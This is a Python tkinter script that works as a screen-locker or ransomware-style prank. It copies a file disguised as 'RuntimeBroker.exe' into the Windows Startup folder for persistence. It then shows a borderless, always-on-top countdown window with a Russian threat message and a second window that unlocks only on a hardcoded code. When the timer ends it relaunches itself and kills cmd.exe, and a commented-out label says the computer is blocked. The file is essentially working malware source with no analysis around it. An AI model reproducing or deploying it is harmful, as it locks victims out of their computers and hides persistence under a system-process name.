import os
import random
import time
from tkinter import *
from tkinter import messagebox
import getpass

os.system("start")

root = Tk()

USER_NAME = getpass.getuser()


os.system(r'move "RuntimeBroker.exe" "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"' % USER_NAME)


def Quit():
    pass

def rooted():
    def deblock(arg):
        if input_command.get() == "1928":
            quit()

    rooted = Tk()

    rooted["bg"] = "red"
    rooted.wm_attributes("-alpha", 1)
    rooted.overrideredirect(1)
    rooted.geometry("500x156+400+330")
    rooted.attributes("-topmost", True)
    rooted.title("Python Guides")

    text = Label(rooted, text="У тебя ровно 20 секунд что бы решить эту проблоему!", font=("Bahnschrift", 11, "bold"),
                 bg="red",
                 fg="white")
    text.pack()

    input_command = Entry(rooted, text="", font=("gabriola", 12, "bold"), width=35,
                          bg="blue",
                          fg="black",
                          bd=0)
    input_command.place(relx=0.23, rely=0.4,
                        height=30)
    input_command.bind("<Return>", deblock)

    rooted.mainloop()

root.protocol("WM_DELETE_WINDOW", Quit)
root["bg"] = "red"
root.wm_attributes("-alpha", 1)
root.overrideredirect(1)
root.geometry("200x100+580+0")
root.attributes("-topmost",True)
root.title("Python Guides")

height = StringVar()
second_input = StringVar()
Hour = StringVar()
Minute = StringVar()
Second = StringVar()

Hour.set("00")
Minute.set("00")
Second.set("20")

Second_entry = Entry(root, width=3, font=("Arial", 70, "bold"),
                     bd=0,
                     bg="red",
                     textvariable=Second)
Second_entry.place(relx=0.25, y=0)

try:
    temp = int(Hour.get()) * 3600 + int(Minute.get()) * 60 + int(Second.get())
except:
    print("Please Input The Correct Value")

while temp > -1:
    Mins, Secs = divmod(temp, 60)

    Hours = 0

    if Mins > 60:
        Hours, Mins = divmod(Mins, 60)

    Hour.set("{0:2d}".format(Hours))

    Minute.set("{0:2d}".format(Mins))

    Second.set("{0:2d}".format(Secs))

    root.update()

    time.sleep(1)

    if (temp == 0):
        root.destroy()

        name = os.path.basename(__file__)
        name_file = name

        os.system("start" + name_file + " && taskkill /f /im cmd.exe")
    #     comp_hacked = Label(text="Твои комп заблокан!", font=("Lucida console", 13, "bold"),
    #                         bd=0,
    #                         bg="#01034f",
    #                         fg="Red")
    #     comp_hacked.place(relx=0.16, rely=0.2)
    # quit()
    temp -= 1

root.mainloop()